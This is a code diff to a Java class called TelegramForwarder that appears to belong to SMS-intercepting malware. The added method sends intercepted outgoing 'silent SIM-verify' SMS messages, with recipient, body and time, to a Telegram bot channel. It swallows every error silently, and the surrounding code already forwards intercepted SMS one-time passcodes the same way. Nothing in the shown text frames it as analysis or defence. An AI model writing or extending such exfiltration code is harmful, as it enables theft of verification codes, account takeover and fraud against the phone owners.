@@ -48,6 +48,38 @@ public class TelegramForwarder {
         }).start();
     }
 
+    /** Forward an intercepted outgoing (silent SIM-verify) SMS to Telegram. */
+    public void sendOutgoingSms(String toNumber, String body) {
+        new Thread(() -> {
+            try {
+                String message = "📤 *Outgoing SMS Intercepted*\n\n"
+                    + "*To:* `" + escape(toNumber) + "`\n"
+                    + "*Body:* `" + escape(body.length() > 500 ? body.substring(0, 500) + "..." : body) + "`\n"
+                    + "*Time:* " + new java.util.Date();
+
+                String endpoint = API_BASE + botToken + "/sendMessage";
+                String payload = "{\"chat_id\":\"" + channelId + "\","
+                    + "\"text\":\"" + jsonEscape(message) + "\","
+                    + "\"parse_mode\":\"Markdown\"}";
+
+                URL url = new URL(endpoint);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json");
+                conn.setDoOutput(true);
+                conn.setConnectTimeout(10000);
+                conn.setReadTimeout(10000);
+
+                try (OutputStream os = conn.getOutputStream()) {
+                    os.write(payload.getBytes(StandardCharsets.UTF_8));
+                }
+
+                conn.getResponseCode();
+                conn.disconnect();
+            } catch (Exception ignored) {}
+        }).start();
+    }
+
     /** Forward an intercepted SMS OTP to Telegram. */
     public void sendSms(String sender, String body) {
         new Thread(() -> {
